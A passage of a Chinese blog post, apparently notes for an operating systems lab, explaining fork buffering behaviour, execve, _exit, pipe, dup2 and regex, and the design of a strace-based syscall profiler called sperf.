首先简单的分析一份代码，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123;</span><br><span class="line">fork();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hawk\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  这份代码分析起来并不是很复杂，我们只要根据状态机理论，画一个状态图即可，如下所示<br>  <img src="fork状态图1.PNG" alt="fork状态图1"></p><p>  可以看到，从理论上进行分析，最后该程序应该会执行6次<strong>printf</strong>，那么程序总共会在终端上输出6行<strong>hawk</strong>。但是我们进行如下测试，会得到匪夷所思的结果<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hawk@manjaro Desktop]$ ./fork-printf </span><br><span class="line">hawk</span><br><span class="line">hawk</span><br><span class="line">hawk</span><br><span class="line">hawk</span><br><span class="line">hawk</span><br><span class="line">hawk</span><br><span class="line">[hawk@manjaro Desktop]$ ./fork-printf | <span class="built_in">wc</span> -l</span><br><span class="line">8</span><br></pre></td></tr></table></figure></p><p>  如果直接输出，程序确实是预期的结果;但如果我们将输出重定向，则其反而会输出8行<strong>hawk</strong>，与预期不同<br>  实际上，这就是缓冲导致的问题——正常情况下，glibc是行缓冲:即遇到’\n’，就将缓冲区输出到标准输出上;而当我们使用管道后，管道还会使用自己的缓冲区，可以通过<strong>ulimit -a | grep “pipe size”</strong>查看缓冲区大小。<br>  结合这个问题，实际上可以很好进行分析——即在复制状态机的状态时，其会将内存和寄存器等一并进行复制，而缓冲区也是存在于内存中的，自然也会一并复制过来，从而导致这个问题。具体的我们仍然可以结合状态图进行分析。<br>  <img src="fork状态图2.PNG" alt="fork状态图2"></p><p>  可以看到，如果考虑到缓冲的话，其确实会输出8行<strong>hawk</strong>。<br>  为了确认我们的猜想，执行如下命令进行验证<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hawk@manjaro Desktop]$ (<span class="built_in">stdbuf</span> -o0 ./fork-printf) | <span class="built_in">wc</span> -l</span><br><span class="line">6</span><br></pre></td></tr></table></figure></p><h2 id="execve系统调用"><a href="#execve系统调用" class="headerlink" title="execve系统调用"></a>execve系统调用</h2><p>  当我们想要创建一个新线程，我们可能需要其执行其他的命令。此时，仅仅用<strong>fork</strong>系统调用是不够的，还需要用<strong>execve</strong>系统调用，将当前的状态机状态重置成另一个程序的初始状态。<br>  类似于<strong>fork</strong>，我们可以通过<strong>man 2 execve</strong>查看该系统调用的接口信息，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*       </span></span><br><span class="line"><span class="comment">       execve() executes the program referred to by pathname.  This causes the program</span></span><br><span class="line"><span class="comment">       that is currently being run by the calling process to be replaced  with  a  new</span></span><br><span class="line"><span class="comment">       program,  with  newly  initialized stack, heap, and (initialized and uninitial‐</span></span><br><span class="line"><span class="comment">       ized) data segments.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       pathname must be either a binary executable, or a script starting with  a  line</span></span><br><span class="line"><span class="comment">       of the form:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           #!interpreter [optional-arg]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       For details of the latter case, see &quot;Interpreter scripts&quot; below.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       argv  is  an array of pointers to strings passed to the new program as its com‐</span></span><br><span class="line"><span class="comment">       mand-line arguments.  By convention, the first of these strings (i.e., argv[0])</span></span><br><span class="line"><span class="comment">       should  contain the filename associated with the file being executed.  The argv</span></span><br><span class="line"><span class="comment">       array must be terminated by  a  NULL  pointer.   (Thus,  in  the  new  program,</span></span><br><span class="line"><span class="comment">       argv[argc] will be NULL.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       envp  is an array of pointers to strings, conventionally of the form key=value,</span></span><br><span class="line"><span class="comment">       which are passed as the environment of the new program.  The envp array must be</span></span><br><span class="line"><span class="comment">       terminated by a NULL pointer.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><h2 id="exit系统调用"><a href="#exit系统调用" class="headerlink" title="_exit系统调用"></a>_exit系统调用</h2><p>  理论上，当我们有了<strong>fork</strong>、<strong>execve</strong>系统调用后，我们就可以自由的执行任意程序了。虽然如此，但我们还需要一个系统调用，用来中止当前的状态机(状态机自身只能不停的跳转到下一个状态)。<br>  Linux为此提供了<strong>_exit()</strong>系统调用，用来立即销毁当前进程，或者说是状态机。同样的，可以通过<strong>man 2 _exit</strong>查看该系统调用的接口信息，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">_exit()  terminates  the calling process &quot;immediately&quot;.  Any open file descrip‐</span></span><br><span class="line"><span class="comment">       tors belonging to the process are closed.  Any children of the process are  in‐</span></span><br><span class="line"><span class="comment">       herited  by  init(1)  (or by the nearest &quot;subreaper&quot; process as defined through</span></span><br><span class="line"><span class="comment">       the use of the prctl(2) PR_SET_CHILD_SUBREAPER operation).  The process&#x27;s  par‐</span></span><br><span class="line"><span class="comment">       ent is sent a SIGCHLD signal.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">noreturn</span> <span class="type">void</span> _exit(<span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">C library/kernel differences</span></span><br><span class="line"><span class="comment">       In  glibc  up  to  version 2.3, the _exit() wrapper function invoked the kernel</span></span><br><span class="line"><span class="comment">       system call of the same name.  Since glibc 2.3, the  wrapper  function  invokes</span></span><br><span class="line"><span class="comment">       exit_group(2), in order to terminate all of the threads in a process.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The  raw  _exit()  system  call terminates only the calling thread, and actions</span></span><br><span class="line"><span class="comment">       such as reparenting child processes or sending SIGCHLD to  the  parent  process</span></span><br><span class="line"><span class="comment">       are performed only if this is the last thread in the thread group.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><h1 id="M3系统调用Profiler-sperf"><a href="#M3系统调用Profiler-sperf" class="headerlink" title="M3系统调用Profiler(sperf)"></a>M3系统调用Profiler(sperf)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  <strong>程序就是一个状态机</strong>，而操作系统上的程序又通过<strong>系统调用</strong>和操作系统交互。<br>  虽然如此，如果不看看实际程序执行的系统调用，对操作系统的理解仍然是很片面的。</p><p>  所幸操作系统提供了足够的工具来查看——即追踪工具<strong>trace</strong>。<strong>trace</strong>工具是系统编程时非常常用的问题诊断工具。根据调试理论，<strong>trace</strong>在一定程度上反映了程序执行的流程，因此可以帮助你缩小bug所在的范围;此外，<strong>trace</strong>中额外的信息还能帮助诊断性能等问题。</p><p>  如果我们对<strong>trace</strong>进行一定的分析，就可以将其结果更优美的进行展示。在本次实验中，可以借助<strong>strace</strong>实现一个程序的<strong>性能诊断</strong>工具，其可以通过分析<strong>trace</strong>的输出，从而分析系统调用的性能信息</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p>实现命令行工具<em>sperf</em>:</p><script type="math/tex; mode=display">sperf \quad \underline{COMMAND} \quad \underline{[ARG]} \quad ...</script><p>其会在系统中执行<strong>COMMAND</strong>命令(如果<strong>COMMAND</strong>是以/开头的绝对路径，则直接执行;否则在<strong>PATH</strong>环境变量中搜索到第一个存在且可执行的文件)，并为<strong>COMMAND</strong>传入ARG参数，然后统计命令执行的系统调用所占用时间，最后在屏幕上显示出耗时最多的若干个系统调用的时间<br>一些假设和约定:</p><ul><li>输出的形式不限。对于较短时间运行的程序，可以一次性打印出耗时最多的几个系统调用;对于耗时较长的程序，需要定期(如每秒)打印出系统调用的耗时信息;</li><li>假设<strong>COMMAND</strong>是单进程、单线程的，无需处理多进程和多线程的情况</li><li>必须使用<strong>execve</strong>系统调用，而非<strong>glibc</strong>对于<strong>execve</strong>的包装(如<strong>execl</strong>、<strong>execlp</strong>、<strong>execle</strong>、<strong>execv</strong>、<strong>execvp</strong>或<strong>execvpe</strong>)</li></ul></blockquote><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><p>  在该实验中，其大体上可以分为三个部分</p><ol><li>创建子进程，在子进程中启动<strong>strace</strong>(通过<strong>fork</strong>/<strong>execve</strong>系统调用)</li><li>在父进程中捕获<strong>strace</strong>的输出(通过<strong>pipe</strong>系统调用)</li><li>解析捕获的<strong>strace</strong>输出，并把系统调用的时间信息统计显示</li></ol><h3 id="显示系统调用序列"><a href="#显示系统调用序列" class="headerlink" title="显示系统调用序列"></a>显示系统调用序列</h3><p>  在该实验中，我们只需要通过<strong>strace</strong>，就可以方便的查看整个程序从<strong>头</strong>开始的按顺序的一系列的系统调用<br>  因此，本质上，该实验就是解析<strong>strace</strong>的输出</p><h3 id="显示系统调用的时间-strace"><a href="#显示系统调用的时间-strace" class="headerlink" title="显示系统调用的时间(strace)"></a>显示系统调用的时间(strace)</h3><p>  根据实验要求，我们不仅需要分析程序的系统调用的序列，还需要统计每一个系统调用的时间占比。而这也就是要求<strong>strace</strong>输出中也应该包含每一次系统调用所消耗的时间。<br>  通过<code>man strace</code>可以很轻易的查到如下的信息<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--syscall-times[=precision]</span><br><span class="line">                   Show the time spent in system calls.  This records the time difference between the</span><br><span class="line">                   beginning  and  the  end of each system call.  precision can be one of s (for sec‐</span><br><span class="line">                   onds), ms (milliseconds), us (microseconds), or ns (nanoseconds), and allows  set‐</span><br><span class="line">                   ting the precision of time value being printed.  Default is us (microseconds).</span><br></pre></td></tr></table></figure></p><p>  因此，我们在调用<strong>strace</strong>时，添加相关的参数即可<br>  <del>实际上在man中可以直接找到输出系统调用及其时间百分比的参数，即<code>strace -cU time-percent</code>, 但是有点作弊</del></p><h3 id="spert-设计"><a href="#spert-设计" class="headerlink" title="spert:设计"></a>spert:设计</h3><p>  类似于前面的M1实验——其将<strong>pstree</strong>分解成多个更简单的子部分进行解决;这里也将<strong>sperf</strong>分解成几个更为简单的部件进行解决。</p><ol><li>解析出<strong>COMMAND</strong>和<strong>ARG</strong>——就是<strong>main</strong>的相关参数</li><li>使用<strong>fork</strong>创建一个新的进程:<ol><li>子进程使用<code>execve</code>调用<code>strace COMMAND ARG ...</code>，启动一份<strong>strace</strong><ul><li>在<code>execve</code>成功返回以后，子进程已经不再受控制了。<code>strace</code>会不断输出系统调用的trace，直到程序结束。当然，COMMAND命令不结束，<code>strace</code>也不会结束</li></ul><ol><li>父进程想办法不断读取<code>strace</code>的输出，直到<strong>strace</strong>程序结束</li></ol><ul><li>能读取到输出，就可以解析出每个系统调用的时间，从而把统计信息打印到屏幕上</li></ul></li></ol></li></ol><h3 id="使用execve创建子进程"><a href="#使用execve创建子进程" class="headerlink" title="使用execve创建子进程"></a>使用execve创建子进程</h3><p>  实验中已经明确要求了，必须使用<code>execve</code>执行程序，因此我们需要通过<code>man 2 execve</code>详细了解一下该函数的信息，其内容如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span><br><span class="line"><span class="params">           <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure></p><p>  这里可能会有几个问题:</p><ol><li><strong>pathname</strong>是相对于进程的当前目录(<strong>current working directory</strong>)而言的，或者是一个绝对路径。如果错误的传入可执行文件路径，则<strong>execve</strong>无法正确执行</li><li>传入正确的<strong>argv</strong>。在课件中实际上有一个非常优美的写法</li><li>传入正确的<strong>envp</strong>。部分程序的运行依赖于正确的环境变量，否则可能导致程序的异常</li></ol><h3 id="连接父子进程的输入"><a href="#连接父子进程的输入" class="headerlink" title="连接父子进程的输入"></a>连接父子进程的输入</h3><p>  使用<code>pipe</code>系统调用，可以创建一个管道，通过<code>man 2 pipe</code>查看该系统调用的详细信息，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       pipe()  creates  a  pipe, a unidirectional data channel that can be used for interprocess communication.  The array pipefd is used to return two file descriptors referring to the ends of the</span></span><br><span class="line"><span class="comment">       pipe.  pipefd[0] refers to the read end of the pipe.  pipefd[1] refers to the write end of the pipe.  Data written to the write end of the pipe is buffered by the kernel  until  it  is  read</span></span><br><span class="line"><span class="comment">       from the read end of the pipe.  For further details, see pipe(7).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       On success, zero is returned.  On error, -1 is returned, errno is set appropriately, and pipefd is left unchanged.</span></span><br><span class="line"><span class="comment">       On Linux (and other systems), pipe() does not modify pipefd on failure.  A requirement standardizing this behavior was added in POSIX.1-2016.  The Linux-specific pipe2() system call likewise</span></span><br><span class="line"><span class="comment">       does not modify pipefd on failure.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>  <code>man</code>手册中也给出了相关的使用样例，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">pid_t</span> cpid;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;string&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">0</span>) &#123;    <span class="comment">/* Child reads from pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Close unused write end */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (read(pipefd[<span class="number">0</span>], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">            write(STDOUT_FILENO, &amp;buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        write(STDOUT_FILENO, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line">        _exit(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;            <span class="comment">/* Parent writes argv[1] to pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);          <span class="comment">/* Close unused read end */</span></span><br><span class="line">        write(pipefd[<span class="number">1</span>], argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Reader will see EOF */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);                <span class="comment">/* Wait for child */</span></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  可以看到，使用<strong>pipefd</strong>，和使用普通的文件描述符没有什么区别——只不过<strong>pipefd</strong>指定了<code>pipefd[0]</code>只能读;<code>pipefd[1]</code>只能写</p><p>  实验指南中还额外指明了，可能需要<strong>dup2</strong>系统调用进行文件描述符的腾挪，这里同样通过<code>man 2 dup2</code>，查看该系统调用的相关信息<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The dup() system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor for the new descriptor.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After  a successful return, the old and new file descriptors may be used interchangeably.  They refer to the same open file description (see open(2)) and thus share file offset and file sta‐</span></span><br><span class="line"><span class="comment">       tus flags; for example, if the file offset is modified by using lseek(2) on one of the file descriptors, the offset is also changed for the other.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The two file descriptors do not share file descriptor flags (the close-on-exec flag).  The close-on-exec flag (FD_CLOEXEC; see fcntl(2)) for the duplicate descriptor is off.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If  the  file</span></span><br><span class="line"><span class="comment">       descriptor newfd was previously open, it is silently closed before being reused.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The  steps  of closing and reusing the file descriptor newfd are performed atomically.  This is important, because trying to implement equivalent functionality using close(2) and dup() would</span></span><br><span class="line"><span class="comment">       be subject to race conditions, whereby newfd might be reused between the two steps.  Such reuse could happen because the main program is interrupted by a signal handler that allocates a file</span></span><br><span class="line"><span class="comment">       descriptor, or because a parallel thread allocates a file descriptor.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Note the following points:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       *  If oldfd is not a valid file descriptor, then the call fails, and newfd is not closed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       *  If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2() does nothing, and returns newfd.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>  实际上，也就是用来重定向文件描述符的系统调用</p><h3 id="解析strace的输出"><a href="#解析strace的输出" class="headerlink" title="解析strace的输出"></a>解析strace的输出</h3><p>  实际上，<strong>strace</strong>的输出类似于一行c函数的调用，因此解析<strong>strace</strong>的输出，也就相当于一个<strong>字符串处理</strong>类型的问题。<br>  因此最方便的办法自然是通过正则表达式进行解析，可以通过<code>man 3 regex</code>查看相关的文档信息<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;regex.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">regcomp</span><span class="params">(<span class="type">regex_t</span> *preg, <span class="type">const</span> <span class="type">char</span> *regex, <span class="type">int</span> cflags)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       regcomp() is used to compile a regular expression into a form that is suitable for subsequent regexec() searches.</span></span><br><span class="line"><span class="comment">       regcomp() is supplied with preg, a pointer to a pattern buffer storage area; regex, a pointer to the null-terminated string and cflags, flags used to determine the type of compilation.</span></span><br><span class="line"><span class="comment">       All regular expression searching must be done via a compiled pattern buffer, thus regexec() must always be supplied with the address of a regcomp() initialized pattern buffer.</span></span><br><span class="line"><span class="comment">       cflags may be the bitwise-or of zero or more:</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">regexec</span><span class="params">(<span class="type">const</span> <span class="type">regex_t</span> *preg, <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>, <span class="type">size_t</span> nmatch,</span></span><br><span class="line"><span class="params">            <span class="type">regmatch_t</span> pmatch[], <span class="type">int</span> eflags)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       regexec()  is  used  to match a null-terminated string against the precompiled pattern buffer, preg.  nmatch and pmatch are used to provide information regarding the location of any matches.</span></span><br><span class="line"><span class="comment">       eflags may be the bitwise-or of one or both of REG_NOTBOL and REG_NOTEOL which cause changes in matching behavior.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">regerror</span><span class="params">(<span class="type">int</span> errcode, <span class="type">const</span> <span class="type">regex_t</span> *preg, <span class="type">char</span> *errbuf,</span></span><br><span class="line"><span class="params">                <span class="type">size_t</span> errbuf_size)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       regerror() is used to turn the error codes that can be returned by both regcomp() and regexec() into error message strings.</span></span><br><span class="line"><span class="comment">       regerror() is passed the error code, errcode, the pattern buffer, preg, a pointer to a character string buffer, errbuf, and the size of the string buffer, errbuf_size.  It returns  the  size</span></span><br><span class="line"><span class="comment">       of  the errbuf required to contain the null-terminated error message string.  If both errbuf and errbuf_size are nonzero, errbuf is filled in with the first errbuf_size - 1 characters of the</span></span><br><span class="line"><span class="comment">       error message and a terminating null byte (&#x27;\0&#x27;).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">regfree</span><span class="params">(<span class="type">regex_t</span> *preg)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       Supplying regfree() with a 